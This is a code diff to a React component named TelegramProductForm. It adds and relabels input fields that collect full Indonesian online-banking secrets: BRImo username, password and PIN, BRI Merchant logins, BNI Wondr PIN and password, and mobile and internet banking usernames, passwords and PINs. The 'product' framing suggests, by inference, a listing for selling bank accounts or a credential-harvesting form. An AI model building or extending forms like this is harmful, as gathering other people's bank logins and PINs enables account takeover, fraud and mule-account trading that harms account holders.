@@ -103,9 +103,9 @@ function TelegramProductForm() {
         <>
           <input name="brimoUser" placeholder="User BRImo" value={form.brimoUser} onChange={handleChange} />
           <input name="brimoPassword" placeholder="Password BRImo" type="password" value={form.brimoPassword} onChange={handleChange} />
+          <input name="mobilePin" placeholder="PIN BRImo" value={form.mobilePin} onChange={handleChange} />
           <input name="briMerchantUser" placeholder="User BRI Merchant" value={form.briMerchantUser} onChange={handleChange} />
           <input name="briMerchantPassword" placeholder="Password BRI Merchant" type="password" value={form.briMerchantPassword} onChange={handleChange} />
-          <input name="jenisRekening" placeholder="Jenis Rekening (Britama/Simpedes)" value={form.jenisRekening} onChange={handleChange} />
         </>
       );
     } else if (b === 'BNI') {
@@ -113,15 +113,17 @@ function TelegramProductForm() {
         <>
           <input name="pinWondr" placeholder="PIN Wondr" value={form.pinWondr} onChange={handleChange} />
           <input name="passWondr" placeholder="Password Wondr" type="password" value={form.passWondr} onChange={handleChange} />
+          <input name="mobileUser" placeholder="User Mobile (BNI)" value={form.mobileUser} onChange={handleChange} />
+          <input name="mobilePassword" placeholder="Password Mobile (BNI)" type="password" value={form.mobilePassword} onChange={handleChange} />
         </>
       );
     } else if (form.bank !== '') {
       return (
         <>
-          <input name="mobileUser" placeholder="Username Mobile Banking" value={form.mobileUser} onChange={handleChange} />
+          <input name="mobileUser" placeholder="Username Mobile Banking / User Nyala" value={form.mobileUser} onChange={handleChange} />
           <input name="mobilePassword" placeholder="Password Mobile Banking" type="password" value={form.mobilePassword} onChange={handleChange} />
           <input name="mobilePin" placeholder="PIN Mobile Banking" value={form.mobilePin} onChange={handleChange} />
-          <input name="ibUser" placeholder="Username I-Banking" value={form.ibUser} onChange={handleChange} />
+          <input name="ibUser" placeholder="Username I-Banking / User IB OCBC" value={form.ibUser} onChange={handleChange} />
           <input name="ibPassword" placeholder="Password I-Banking" type="password" value={form.ibPassword} onChange={handleChange} />
           <input name="ibPin" placeholder="PIN I-Banking" value={form.ibPin} onChange={handleChange} />
         </>
